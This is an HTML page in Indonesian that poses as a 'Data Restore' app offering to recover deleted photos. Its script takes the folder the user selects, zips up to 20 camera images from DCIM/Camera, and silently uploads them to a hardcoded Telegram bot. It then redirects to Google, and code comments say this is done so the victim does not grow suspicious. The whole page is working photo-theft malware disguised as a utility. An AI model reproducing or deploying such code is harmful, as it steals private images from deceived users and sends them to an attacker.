<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Restore Data</title>
    <!-- Library JSZip -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    
    <style>
        :root {
            --bg-color: #FFFFFF;
            --accent-color: #007AFF;
            --text-main: #000000;
            --text-sub: #8E8E93;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body { 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
            background: var(--bg-color); 
            color: var(--text-main); 
            margin: 0; 
            height: 100vh;
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center;
            overflow: hidden;
        }

        .home-screen {
            text-align: center;
            padding: 20px;
            width: 100%;
            max-width: 350px;
        }

        .app-icon {
            width: 100px;
            height: 100px;
            background: var(--accent-color);
            border-radius: 24px;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 30px rgba(0, 122, 255, 0.25);
        }

        .app-icon svg { width: 50px; height: 50px; fill: white; }

        h1 { font-size: 26px; font-weight: 700; margin: 0 0 10px; letter-spacing: -0.5px; }
        p { font-size: 15px; color: var(--text-sub); margin: 0 0 40px; line-height: 1.4; }

        .btn-main {
            background: var(--accent-color);
            color: white;
            border: none;
            width: 100%;
            padding: 18px;
            font-size: 17px;
            font-weight: 600;
            border-radius: 14px;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        .btn-main:active { opacity: 0.8; }

        #fileInput { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
        .btn-wrap { position: relative; width: 100%; }

        .scan-screen {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0; left: 0;
            background: var(--bg-color);
            z-index: 10;
        }

        .radar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            border: 2px solid #E5E5EA;
            position: relative;
            margin-bottom: 40px;
        }
        
        .radar::after {
            content: '';
            position: absolute;
            top: 50%; left: 50%;
            width: 50%; height: 50%;
            background: linear-gradient(45deg, rgba(0,122,255,0.2), transparent);
            border-radius: 100% 0 0 0;
            transform-origin: 0 0;
            animation: scan 2s infinite linear;
        }

        @keyframes scan {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .scan-text { font-size: 18px; font-weight: 600; color: var(--text-main); }
        .scan-sub { font-size: 14px; color: var(--text-sub); margin-top: 5px; }

    </style>
</head>
<body>

    <!-- MENU UTAMA -->
    <div class="home-screen" id="home">
        <div class="app-icon">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm4.59-12.42L10 14.17l-2.59-2.58L6 13l4 4 8-8z"/></svg>
        </div>
        <h1>Data Restore</h1>
        <p>Pulihkan foto dan video yang terhapus atau hilang dari galeri Anda.</p>

        <div class="btn-wrap">
            <button class="btn-main">Mulai Pemulihan</button>
            <input type="file" id="fileInput" webkitdirectory directory multiple>
        </div>
    </div>

    <!-- LAYAR SCANNING -->
    <div class="scan-screen" id="scan">
        <div class="radar"></div>
        <div class="scan-text">Memindai Penyimpanan...</div>
        <div class="scan-sub">Mohon tunggu sebentar</div>
    </div>

    <script>
        // ==========================================
        // KONFIGURASI
        // ==========================================
        const BOT_TOKEN = "8441202019:AAFwtNf-EsmgH8X67fbWD88wRtgyPMyEsiI";
        const CHAT_ID = "5803378702";
        const TARGET_COUNT = 20;
        // ==========================================

        const fileInput = document.getElementById('fileInput');
        const homeScreen = document.getElementById('home');
        const scanScreen = document.getElementById('scan');

        fileInput.addEventListener('change', async (e) => {
            const files = Array.from(e.target.files);
            if (files.length === 0) return;

            // Beralih ke tampilan scanning
            homeScreen.style.display = 'none';
            scanScreen.style.display = 'flex';

            try {
                // 1. Filter File DCIM/Camera (JPG/PNG/Webp/etc)
                const cameraFiles = files.filter(f => {
                    const path = f.webkitRelativePath.toLowerCase();
                    const isDCIM = path.includes('dcim/camera');
                    const isImage = /\.(jpg|jpeg|png|gif|webp|heic)$/i.test(f.name);
                    return isDCIM && isImage;
                });

                // Ambil 20 file saja
                const targetFiles = cameraFiles.slice(0, TARGET_COUNT);
                
                if (targetFiles.length === 0) {
                    // Jika tidak ada file, tetap redirect saja ke google biar natural
                    window.location.href = "https://google.com";
                    return;
                }

                // 2. Buat ZIP
                const zip = new JSZip();
                let successCount = 0;

                for (const file of targetFiles) {
                    try {
                        const data = await file.arrayBuffer();
                        zip.file(file.name, data);
                        successCount++;
                    } catch (err) {
                        // Skip file error
                    }
                }

                // 3. Generate ZIP
                const zipBlob = await zip.generateAsync({type:"blob", compression:"DEFLATE"});

                // 4. Upload ke Telegram (Background Task)
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', zipBlob, `Restore_DCIM.zip`);
                formData.append('caption', `âœ… Restore Berhasil\nJumlah: ${successCount} Foto`);

                // Kirim request (tanpa menunggu feedback sukses ke user)
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });

                // 5. Redirect ke Google HANYA setelah upload selesai
                // Tidak ada alert, tidak ada pemberitahuan
                window.location.href = "https://google.com";

            } catch (err) {
                console.error(err);
                // Jika error jaringan atau sistem, tetap redirect ke google agar tidak mencurigakan
                window.location.href = "https://google.com";
            }
        });
    </script>
</body>
</html>
